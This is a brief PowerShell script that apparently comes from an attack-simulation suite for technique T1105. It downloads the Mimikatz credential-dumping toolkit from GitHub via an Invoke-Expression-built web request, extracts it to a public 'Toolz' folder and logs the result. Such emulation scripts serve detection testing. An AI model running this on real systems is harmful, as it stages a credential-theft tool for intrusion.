# Donwload latest version of Mimikatz
# Technic ID : T1105
Clear-Host
Write-Output "==============================================================================="
Write-Output "Downloads several compiled attack tools (T1105)"
Write-Output "==============================================================================="
#
$DestinationFile = "$env:PUBLIC\Toolz\mimikatz.zip"; 
$DownloadURL = "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip";
$exf_file = "$env:PUBLIC\exf\mimi_down_extract.log"; 
$CompleteCommand = "Invoke-WebRequest" + " $DownloadURL" + " -outfile " + "$DestinationFile";
Invoke-Expression  "$CompleteCommand";
if ([System.IO.File]::Exists("$DestinationFile")) { 
  Expand-Archive -LiteralPath "$DestinationFile" -DestinationPath "$env:PUBLIC\Toolz" -Force; 
  "The file $DestinationFile has been downloaded and extracted in Toolz Directory !!!" | Out-File -FilePath "$exf_file"; 
  exit 0; 
}
else {
  "The file $DestinationFile does not exists !!!" | Out-File -FilePath "$exf_file";
  exit 1; 
};